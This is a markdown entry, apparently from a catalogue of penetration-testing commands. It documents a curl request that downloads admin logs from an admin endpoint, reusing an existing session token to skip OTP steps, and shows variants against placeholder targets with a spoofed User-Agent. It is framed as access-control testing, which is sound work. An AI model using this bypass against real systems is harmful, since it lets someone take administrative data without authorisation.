---
data: >-
  curl -X GET 'https://lark.example.com/admin/logs/download' -H 'Authorization:
  Bearer YOUR_JWT_TOKEN' -H 'Content-Type: application/json' -o admin_logs.zip
tags:
  - web
  - bypass
  - access
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 20ec0585-74a4-44bf-8b30-51c186a7c256
created_at: '2025-12-14T17:29:57.331Z'
updated_at: '2025-12-14T17:29:57.331Z'
verified: false
validated: true
submitted: true
---
# curl-direct-endpoint-access

## Command

```bash
curl -X GET 'https://lark.example.com/admin/logs/download' -H 'Authorization: Bearer YOUR_JWT_TOKEN' -H 'Content-Type: application/json' -o admin_logs.zip
```

## Description

This command uses curl to directly access a web endpoint for downloading admin logs, bypassing authentication steps like OTP by leveraging an existing session token. It is useful for testing access control vulnerabilities in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `'https://lark.example.com/admin/logs/download'` | The target endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_JWT_TOKEN'` | Session token header for authentication | Yes |
| `-H 'Content-Type: application/json'` | Sets request content type (if needed) | No |
| `-o admin_logs.zip` | Outputs the response to a file | Yes |

## Examples

### Basic Usage

```bash
curl -X GET 'https://target.com/admin/logs/download' -H 'Authorization: Bearer token123' -o logs.zip
```

### Advanced Usage

```bash
curl -X GET 'https://target.com/admin/logs/download?format=zip' -H 'Authorization: Bearer token123' -H 'User-Agent: Mozilla/5.0' -o logs.zip --verbose
```

## Expected Output

A binary file (e.g., ZIP archive) containing admin logs, or JSON data if the endpoint returns structured logs. Successful execution shows no errors and a non-zero file size; failure may return 403 or redirect to OTP page.

## Related

- [[Related Procedure]]
